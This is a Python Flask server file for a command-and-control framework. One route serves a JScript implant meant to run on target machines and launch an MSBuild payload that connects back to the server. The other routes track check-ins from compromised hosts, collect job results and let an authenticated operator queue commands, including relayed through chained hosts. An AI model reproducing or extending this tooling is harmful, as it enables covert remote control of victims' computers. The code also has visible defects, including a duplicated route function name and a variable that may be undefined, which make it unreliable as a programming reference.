import datetime

from connect import app, api_key, db
from connect.server.database import Routes, Connections, Jobs
from flask import request, render_template, jsonify
from datetime import datetime

"""
Connection Routes

These routes control delivering, establishing and updating connections. 
"""


def load_route(name):
    return Routes.query.filter(Routes.name == name).one().identifier


@app.route("/<int(fixed_digits=10):route>", methods=['POST', 'GET'])
def unidentified(route):
    print(f'Unidentified route hit: {route}')
    print(f'Data: {request.get_data()}')
    return ""

@app.route(f"/{load_route('check_in')}", methods=['POST', 'GET'])
def check_in():
    """
    Check_In Route

    The check-in route expects a check_in_packet containing the following items.
     - job_results_packet: [job_id, results]
     - check_in_packet : [ [job_results_packet], [job_results_packet], [job_results_packet] ]

    The check-in route returns a response_packet containing the following items.
     - job_packet: [job_name, job_arguments]
     - response_packet : {job_id: job_packet, job_id: job_packet,}
    """

    for job_packet in request.get_json(force=True):
        job = Jobs.query.filter_by(identifier=job_packet[0]).first()
        job.status = 'completed'
        job.connection.check_in = datetime.now()
        if len(job_packet) > 1:
            job.results = job_packet[1]
        db.session.add(job)
        db.session.commit()
        if job.name == 'check_in':
            uncompleted_jobs = {}
            for job in job.connection.jobs:
                if job.status != 'completed':
                    uncompleted_jobs.update({job.identifier: [job.name, job.arguments]})
    return jsonify(uncompleted_jobs)


@app.route(f"/{load_route('jscript')}", methods=['POST', 'GET'])
def check_in():
    """
    JScript Route

    The JScript route expects a get request and will return a implant to be executed on the target(s) machine. The 
    implant will attempt to launch a CSharp MSBuild payload to establish a command and control connection to the 
    framework.
    """
    connection = Connections()
    db.session.add(connection)
    db.session.commit()
    job = Jobs(name='check_in', connection=connection)
    db.session.add(job)
    db.session.commit()
    return render_template('connect.js', connection_id=connection.identifier,
                           check_in_uri=f"{request.host_url}{load_route('check_in')}",
                           check_in_job_id=job.identifier)


"""
REST API

The following static routes control data flow between the server and operator(s).
"""


def authenticated(data):
    if data:
        return data['api_key'] == api_key
    return False

def serialize(model):
    dictionary = {}
    for item in model:
        dictionary[item.identifier] = item.get_list()
    return dictionary

@app.route("/connections", methods=['POST'])
def connections():
    data = request.get_json(force=True)
    if not authenticated(data):
        return "Not authenticated"
    return jsonify(serialize(Connections.query.all()))


@app.route("/routes", methods=['POST'])
def routes():
    data = request.get_json(force=True)
    if not authenticated(data):
        return "Not authenticated"
    return jsonify(serialize(Routes.query.all()))


def schedule_job(name, connection, arguments):
    if connection.parent_id:
        job = Jobs(name=name, connection=connection, arguments=arguments)
        connection_packet = f'{{ "connection_id":{connection.connection_id}, "jobs":[{{ "job_id": {job.id}, "name": {job.name}, "arguments": {job.arguments} }}]}}'
        db.session.add(job)
        db.session.commit()
        schedule_job('downstream', connection.parent, connection_packet)
    else:
        job = Jobs(name=name, connection=connection, arguments=arguments)
        db.session.add(job)
        db.session.commit()


@app.route("/jobs", methods=['POST'])
def jobs():
    data = request.get_json(force=True)
    if not authenticated(data):
        return "Not authenticated"
    if 'name' in data.keys():
        connection = Connections.query.filter_by(identifier=data['connection_id']).first()
        schedule_job(data['name'], connection, data['arguments'])
    return jsonify(serialize(Jobs.query.all()))
